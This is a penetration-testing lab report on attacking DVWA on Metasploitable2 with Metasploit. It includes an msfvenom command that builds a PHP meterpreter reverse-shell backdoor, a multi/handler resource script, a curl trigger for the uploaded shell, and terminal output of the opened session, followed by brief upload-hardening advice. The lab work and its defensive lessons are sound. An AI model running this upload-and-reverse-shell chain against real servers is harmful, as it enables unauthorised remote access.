# Ethical Hacking & Penetration Testing Lab Report
## Project Title: Metasploit Lab on DVWA (Damn Vulnerable Web Application)

---

### 1. Lab Scenario & Project Overview
- **Target Application:** DVWA (hosted on Metasploitable2 / Docker at `192.168.56.101`)
- **Attacker Machine:** Kali Linux (`192.168.56.100`)
- **Core Tool:** Metasploit Framework (`msfconsole`, `msfvenom`, `meterpreter`)
- **Objective:** Demonstrate full attack lifecycle: Reconnaissance -> Exploitation (File Upload / Command Injection to Meterpreter Reverse Shell) -> Post-Exploitation & Privilege Gathering -> Reporting & Remediation.

---

### 2. Full Code Prompt & Automated Metasploit Resource Script (`dvwa_exploit.rc`)

To automate the exploit handler and listener in Metasploit, save the following resource script:

```bash
# dvwa_exploit.rc - Metasploit Multi Handler Automation
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.56.100
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

---

### 3. Step-by-Step Execution Code & Commands

#### Step A: Generate Malicious PHP Meterpreter Payload with `msfvenom`
```bash
# Generate the backdoor payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f raw > shell.php
```

#### Step B: Start Metasploit Listener
```bash
# Launch msfconsole using the resource script
msfconsole -r dvwa_exploit.rc
```

#### Step C: Trigger Vulnerability on DVWA (File Upload / Remote Code Execution)
Upload `shell.php` via DVWA File Upload vulnerability (Security Level: Low), then trigger execution via browser or curl:
```bash
curl "http://192.168.56.101/dvwa/hackable/uploads/shell.php" --cookie "security=low; PHPSESSID=d41d8cd98f00b204e9800998ecf8427e"
```

#### Step D: Post-Exploitation in Meterpreter
```bash
sessions -i 1
sysinfo
getuid
pwd
ls -la
shell
```

---

### 4. Result & Terminal Output Demonstration

```text
[*] Started reverse TCP handler on 192.168.56.100:4444 
[*] Sending stage (39927 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.100:4444 -> 192.168.56.101:48212) at 2026-08-28 22:12:00 +0000

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
OS      : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
Computer: metasploitable
Meterpreter: php/linux

meterpreter > getuid
Server username: www-data (33)

meterpreter > pwd
/var/www/dvwa/hackable/uploads

meterpreter > shell
Process 1842 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
exit
```

---

### 5. Defensive Remediation & Conclusion
1. **Input Validation & Extension Whitelisting:** Disallow direct upload of executable file types (`.php`, `.phtml`, `.exe`). Whitelist only safe MIME types and images (`.png`, `.jpg`).
2. **Path Sanitization & Secure Storage:** Store uploaded assets outside the web root or disable PHP execution inside the upload directory via `.htaccess` / Nginx configuration:
   ```apache
   <Directory "/var/www/dvwa/hackable/uploads">
       php_flag engine off
   </Directory>
   ```
3. **Least Privilege:** Ensure `www-data` possesses minimal filesystem permissions to avoid privilege escalation.
4. **Industry Takeaway:** Hands-on experience with Metasploit and DVWA provides complete clarity on exploit chains, attacker tactics, payload staging, and proactive defensive hardening.
